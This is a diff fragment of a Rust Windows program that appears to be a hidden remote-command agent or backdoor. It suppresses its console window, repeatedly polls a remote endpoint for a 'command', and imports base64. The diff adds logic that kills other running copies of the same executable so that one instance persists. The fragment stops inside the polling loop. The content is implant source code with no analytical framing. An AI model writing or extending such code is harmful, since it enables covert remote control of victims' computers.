@@ -1,15 +1,35 @@
 
 #![windows_subsystem = "windows"]
+
 use std::error::Error;
 use std::os::windows::process::CommandExt;
 use std::process::Command;
-use std::thread;
+use std::{env, thread};
+use std::path::Path;
 use std::time::Duration;
 use base64::prelude::*;
+use sysinfo::{get_current_pid, System};
 
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 
 fn main() {
+
+    let s = System::new_all();
+
+    let binding = env::current_exe().unwrap();
+    let exe_path= Path::new(&binding);
+
+    let exe_name = exe_path.file_name().unwrap();
+
+    let current_pid = get_current_pid().unwrap();
+
+    for process in s.processes_by_name(exe_name) {
+        if process.pid() ==current_pid{
+            continue;
+        }
+        process.kill();
+    }
+
     loop {
         thread::spawn(|| {
             let command = match get_request_response("command") {
